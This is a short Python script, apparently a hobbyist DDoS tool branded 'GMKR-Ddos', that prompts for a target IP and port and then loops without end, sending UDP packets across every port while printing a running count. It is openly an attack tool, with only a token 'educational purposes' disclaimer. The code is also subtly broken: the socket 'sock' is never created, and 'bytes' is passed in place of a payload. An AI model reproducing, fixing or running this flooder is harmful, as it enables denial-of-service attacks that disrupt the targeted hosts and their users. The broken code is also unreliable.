print ("\033[92m")

import os
import time
import socket

os.system("clear")
os.system("figlet GMKR-Ddos")
print
print ("Initially Coded By : GAMKERS")
print ("Code Fixed And Optimised By: GigaChadLakshay")
ip = input("Target IP: ")
port = int(input("Port: "))
os.system("clear")
os.system("figlet Laksx")
print ("\033[92m")
print("STARTING DOS ATTACK...")
time.sleep(5)
print ("    DDOS ATTACK STARTED. NOTE: ONLY FOR EDUCATIONAL PURPOSES")
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print ("Sent %s packet to %s on port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
